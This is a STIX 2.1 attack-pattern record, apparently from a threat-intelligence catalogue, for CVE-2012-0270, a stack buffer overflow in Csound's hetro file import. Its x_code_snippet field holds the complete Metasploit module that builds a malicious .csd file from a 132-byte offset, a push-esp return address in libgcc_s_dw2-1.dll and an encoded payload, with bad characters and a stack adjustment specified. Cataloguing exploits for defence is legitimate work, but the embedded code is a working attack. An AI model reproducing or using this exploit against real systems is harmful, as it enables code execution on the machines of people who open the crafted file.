{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eef6b480-54de-4b62-b893-6b1186a79715",
    "created": "2024-08-14T16:36:18.558855Z",
    "modified": "2024-08-14T16:36:18.558859Z",
    "name": "Csound hetro File Handling Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in Csound before 5.16.6. The overflow occurs when trying to import a malicious hetro file from tabular format. In order to achieve exploitation the user should import the malicious file through csound with a command like \"csound -U het_import msf.csd file.het\". This exploit doesn't work if the \"het_import\" command is used directly to convert the file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/csound_getnum_bof.rb",
            "external_id": "csound_getnum_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0270"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120514124556/http://secunia.com/secunia_research/2012-3/"
        },
        {
            "source_name": "reference",
            "url": "http://csound.git.sourceforge.net/git/gitweb.cgi?p=csound/csound5.git;a=commit;h=7d617a9551fb6c552ba16874b71266fcd90f3a6f"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Csound hetro File Handling Stack Buffer Overflow',\n      'Description' => %q{\n          This module exploits a buffer overflow in Csound before 5.16.6.\n        The overflow occurs when trying to import a malicious hetro file\n        from tabular format.\n        In order to achieve exploitation the user should import the malicious\n        file through csound with a command like \"csound -U het_import msf.csd file.het\".\n        This exploit doesn't work if the \"het_import\" command is used directly\n        to convert the file.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Secunia', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2012-0270' ],\n          [ 'OSVDB', '79491' ],\n          [ 'BID', '52144' ],\n          [ 'URL', 'http://web.archive.org/web/20120514124556/http://secunia.com/secunia_research/2012-3/' ],\n          [ 'URL', 'http://csound.git.sourceforge.net/git/gitweb.cgi?p=csound/csound5.git;a=commit;h=7d617a9551fb6c552ba16874b71266fcd90f3a6f']\n        ],\n      'Payload' =>\n        {\n          'Space' => 650,\n          'BadChars' => \"\\x00\\x0a\\x1a\\x2c\\xff\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\", # Stack adjustment # add esp, -3500\n          'DisableNops' => 'True'\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          [ 'Csound 5.15 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Offset' => 132,\n              'Ret' => 0x6e955446 # push esp #  ret / libgcc_s_dw2-1.dll\n            }\n          ],\n        ],\n      'Privileged' => false,\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2012-02-23'))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.csd']),\n      ])\n  end\n\n  def exploit\n    sploit = rand_text(target['Offset'])\n    sploit << [target.ret].pack(\"V\")\n    sploit << payload.encoded\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-23",
    "x_mitre_platforms": [
        "win'"
    ]
}